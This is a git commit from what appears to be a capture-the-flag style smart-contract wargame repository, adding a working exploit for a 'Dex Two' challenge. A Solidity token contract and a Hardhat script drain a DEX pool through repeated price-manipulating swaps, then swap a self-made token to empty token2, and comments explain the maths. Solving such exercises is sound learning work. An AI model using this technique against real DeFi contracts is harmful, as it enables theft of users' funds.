79956d25f6bb7a924852d02b242442c95e05d210
gdupont <gdupont.pro@gmail.com>
2023-02-20 16:22:29 +0100

    dex2 is done

---
+++ contracts/23.Dex2/myToken.sol
@@ -0,0 +1,24 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
+
+contract MyToken is ERC20 {
+    address private _dex;
+
+    constructor(
+        address dexInstance,
+        string memory name,
+        string memory symbol,
+        uint initialSupply
+    ) ERC20(name, symbol) {
+        _mint(msg.sender, initialSupply);
+        _transfer(msg.sender, dexInstance, 1);
+        _dex = dexInstance;
+        approve(msg.sender, dexInstance, 2 ^ (256 - 1));
+    }
+
+    function approve(address owner, address spender, uint256 amount) public {
+        require(owner != _dex, "InvalidApprover");
+        super._approve(owner, spender, amount);
+    }
+}
--- scripts/23.Dex2/Dex2.ts
+++ scripts/23.Dex2/Dex2.ts
@@ -1,11 +1,11 @@
 import { ethers } from "hardhat";
 import { BigNumber, Contract } from "ethers";
-import { abi } from "../../artifacts/contracts/22.Dex/Dex.sol/Dex.json";
+import { abi } from "../../artifacts/contracts/23.Dex2/DexTwo.sol/DexTwo.json";
 import { abi as SwappableTokenAbi } from "../../artifacts/contracts/22.Dex/Dex.sol/SwappableToken.json";
 import { displayResult } from "../../utils/displayResult";
 import { deployContract } from "../../utils/deployContract";
 
-const targetAddress = "0x4921B6C48E4934283a5154DBeB6E73292B46D5e7";
+const targetAddress = "0xa553fb05995E282e3efcc8fB35b9d8957eEd445c";
 
 async function main() {
   const [attacker] = await ethers.getSigners();
@@ -24,7 +24,6 @@ async function main() {
   );
   let token1Balance = (await token1.balanceOf(attacker.address)) as BigNumber;
   let token2Balance = (await token2.balanceOf(attacker.address)) as BigNumber;
-
   let alternate = false;
 
   while (!token1Balance.eq(110) && !token2Balance.eq(110)) {
@@ -36,7 +35,7 @@ async function main() {
     }
     alternate = !alternate;
     let amount = (await from.balanceOf(attacker.address)) as BigNumber;
-    const price = await target.getSwapPrice(from.address, to.address, amount);
+    const price = await target.getSwapAmount(from.address, to.address, amount);
     amount = price.lt(110) ? amount : BigNumber.from(45);
 
     const tx = await target.swap(from.address, to.address, amount);
@@ -45,7 +44,18 @@ async function main() {
     token2Balance = (await token2.balanceOf(attacker.address)) as BigNumber;
   }
 
-  displayResult(token1Balance.eq(110) || token2Balance.eq(110));
+  const myToken = await deployContract("MyToken", attacker, [
+    target.address,
+    "MyToken",
+    "MT",
+    2,
+  ]);
+
+  const tx = await target.swap(myToken.address, token2.address, 1);
+  await tx.wait();
+  token2Balance = (await token2.balanceOf(attacker.address)) as BigNumber;
+
+  displayResult(token1Balance.eq(110) && token2Balance.eq(110));
 }
 
 main().catch((error) => {
@@ -54,6 +64,9 @@ main().catch((error) => {
 });
 
 /*  Explanation of the code:
+
+  Let's first do the same thing as in Dex. 
+  ---------------------------------------
   To take all of the money inside the pool, we jsut have to do consecutive swaps
   Each time, it will desequilibrate the pool and we will be able to take more money.
   We will swap the maximun every time, execpt for the last swap.
@@ -81,10 +94,19 @@ main().catch((error) => {
   a * 110 / 45 = 110                          
   a * 110 = 45 * 110
   a = 45
+
   Last swap:
             110, 0                  <-        20, 90  
-  
-  Now we have all the tokenX.
  
+  Now we have all the tokenX.
+  ---------------------------
+  Now we can do the rest:
+  The swap function does not check if we are swaping token1 with token2.
+  So we can swap token2 with a token that we control.
+  If we make sure that the following equation is true, we will be able to take all the token2:
+      amount * token2PoolBalance / token1PoolBalance = token2PoolBalance
+ <==> amount * 90 = token1PoolBalance * 90
+ <==> amount = token1PoolBalance and token1PoolBalance != 0
+ So we just have to create a token where token1PoolBalance = 1 and swap 1 of it.
 
   */
